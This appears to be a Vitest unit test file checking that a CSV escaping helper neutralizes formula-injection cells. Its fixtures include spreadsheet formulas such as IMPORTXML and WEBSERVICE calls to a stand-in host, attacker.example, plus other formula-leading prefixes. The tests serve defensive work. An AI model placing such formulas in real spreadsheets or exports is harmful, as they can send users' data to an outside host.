import { describe, expect, it } from "vitest";

import { escapeCsvField } from "../lib/csv-helpers";

describe("script CSV helpers", () => {
  it("neutralizes formula-leading spreadsheet cells before CSV quoting", () => {
    expect(escapeCsvField('=IMPORTXML("https://attacker.example","//x")')).toBe(
      '"\'=IMPORTXML(""https://attacker.example"",""//x"")"',
    );
    expect(escapeCsvField("+SUM(1,1)")).toBe("\"'+SUM(1,1)\"");
    expect(escapeCsvField("-malicious")).toBe("'-malicious");
    expect(escapeCsvField("@malicious")).toBe("'@malicious");
    expect(escapeCsvField("  @malicious")).toBe("'  @malicious");
    expect(escapeCsvField('\t=WEBSERVICE("https://attacker.example")')).toBe(
      '"\'\t=WEBSERVICE(""https://attacker.example"")"',
    );
    expect(escapeCsvField("\r=malicious")).toBe('"\'\r=malicious"');
  });

  it("keeps numeric values numeric while escaping CSV delimiters", () => {
    expect(escapeCsvField(-1)).toBe("-1");
    expect(escapeCsvField("plain,text")).toBe('"plain,text"');
    expect(escapeCsvField(null)).toBe("");
  });
});
